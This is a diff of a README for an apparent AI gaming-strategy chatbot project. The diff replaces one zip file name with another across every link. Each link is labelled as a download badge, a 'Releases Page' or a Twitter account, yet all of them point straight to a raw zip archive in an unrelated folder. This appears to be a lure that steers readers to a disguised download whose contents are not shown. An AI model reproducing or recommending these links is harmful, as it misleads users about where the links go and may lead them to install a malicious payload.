@@ -1,6 +1,6 @@
 # 🎮 ai-gaming-strategy-coach-chatbot - Your AI Guide to Winning Games
 
-[![Download](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming-chatbot-coach-strategy-ai-3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming-chatbot-coach-strategy-ai-3.8.zip)
+[![Download](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming_chatbot_ai_strategy_coach_v1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming_chatbot_ai_strategy_coach_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -25,9 +25,9 @@ To ensure smooth operation, your system should meet the following requirements:
 
 ## 📥 Download & Install
 
-To get the software, visit the [Releases Page](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming-chatbot-coach-strategy-ai-3.8.zip) on GitHub. Here you will find the latest version of the chatbot. Follow these instructions:
+To get the software, visit the [Releases Page](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming_chatbot_ai_strategy_coach_v1.7.zip) on GitHub. Here you will find the latest version of the chatbot. Follow these instructions:
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming-chatbot-coach-strategy-ai-3.8.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming_chatbot_ai_strategy_coach_v1.7.zip).
 2. Find the latest version listed.
 3. Click on the appropriate file for your operating system to download it.
 
@@ -64,7 +64,7 @@ If you encounter any issues or have questions about using the chatbot, please vi
 
 Stay updated with the latest features and improvements. Consider joining our community on social media:
 
-- **Twitter**: [@aiGamingCoach](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming-chatbot-coach-strategy-ai-3.8.zip)
+- **Twitter**: [@aiGamingCoach](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming_chatbot_ai_strategy_coach_v1.7.zip)
 - **Discord**: Join our Discord server to chat with other users and share strategies.
 
 ## ⚙️ Project Structure
@@ -77,4 +77,4 @@ Stay updated with the latest features and improvements. Consider joining our com
 
 This project is licensed under the MIT License. Please feel free to fork and contribute to the repository.
 
-For more details, visit our [Releases Page](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming-chatbot-coach-strategy-ai-3.8.zip) to download now. Enjoy your gaming experience and kickstart new strategies with your AI coach!
+For more details, visit our [Releases Page](https://raw.githubusercontent.com/salah15cl/ai-gaming-strategy-coach-chatbot/main/Hebraic/gaming_chatbot_ai_strategy_coach_v1.7.zip) to download now. Enjoy your gaming experience and kickstart new strategies with your AI coach!
